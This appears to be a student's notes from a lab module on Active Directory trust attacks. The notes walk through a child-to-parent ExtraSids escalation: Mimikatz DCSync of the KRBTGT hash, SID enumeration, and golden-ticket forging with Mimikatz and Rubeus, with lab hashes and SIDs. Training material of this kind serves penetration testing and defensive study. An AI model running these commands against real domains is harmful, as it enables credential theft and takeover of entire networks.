#### Obtaining the KRBTGT Account's NT Hash using Mimikatz

```powershell
PS C:\htb> mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```
![](Screenshot%202026-06-01%20at%2013.30.12.png)
#### Using Get-DomainSID

```powershell
PS C:\htb> Get-DomainSID 

S-1-5-21-2806153819-209893948-922872689
```
#### Obtaining Enterprise Admins Group's SID using Get-DomainGroup

```powershell
PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```
![](Screenshot%202026-06-01%20at%2013.31.47.png)

At this point, we have gathered the following data points:

- The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f`
- The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689`
- The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: `hacker`
- The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
- The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`
#### Using ls to Confirm No Access

```powershell
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
```
![](Screenshot%202026-06-01%20at%2013.32.17.png)
#### Creating a Golden Ticket with Mimikatz

```powershell
PS C:\htb> mimikatz.exe

mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```
![](Screenshot%202026-06-01%20at%2013.33.05.png)
#### Confirming a Kerberos Ticket is in Memory Using klist

```powershell
PS C:\htb> klist
```
![](Screenshot%202026-06-01%20at%2013.33.26.png)
#### Listing the Entire C: Drive of the Domain Controller

```powershell
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
```
![](Screenshot%202026-06-01%20at%2013.34.01.png)
## ExtraSids Attack - Rubeus
#### Using ls to Confirm No Access Before Running Rubeus

```powershell
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
```
#### Creating a Golden Ticket using Rubeus

```powershell
PS C:\htb> .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```
#### Confirming the Ticket is in Memory Using klist

```powershell
PS C:\htb> klist
```
![](Screenshot%202026-06-01%20at%2013.35.02.png)
#### Performing a DCSync Attack

```powershell
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
```

```powershell
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

